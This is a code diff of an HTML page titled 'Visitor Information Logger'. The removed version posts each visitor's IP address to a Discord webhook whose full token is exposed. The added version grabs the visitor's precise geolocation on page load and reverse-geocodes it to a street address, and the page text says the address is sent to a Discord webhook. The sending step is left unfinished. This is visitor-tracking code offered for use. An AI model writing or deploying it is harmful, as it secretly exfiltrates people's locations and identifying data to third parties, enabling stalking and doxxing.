@@ -1,17 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Send IP to Discord Webhook</title>
-</head>
-<body>
+    <title>Visitor Information Logger</title>
     <script>
-        fetch('https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ content: 'Visitor IP: ' + '{{ip}}' }),
-        });
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const locationData = {
+                latitude: latitude,
+                longitude: longitude
+            };
+
+            // Reverse geocoding API call to get address from coordinates
+            fetch(`https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=YOUR_API_KEY`)
+                .then(response => response.json())
+                .then(data => {
+                    const address = data.results[0].formatted;
+                    const locationWithAddress = {
+                        latitude: latitude,
+                        longitude: longitude,
+                        address: address
+                    };
+
+                    // Continue with the rest of the code to log and send the information
+                });
+        }
     </script>
+</head>
+<body onload="getLocation()">
+    <h1>Visitor Information Logger</h1>
+    <p>This page will log various details about the visitor, including their precise address, and send it to a Discord webhook.</p>
 </body>
 </html>
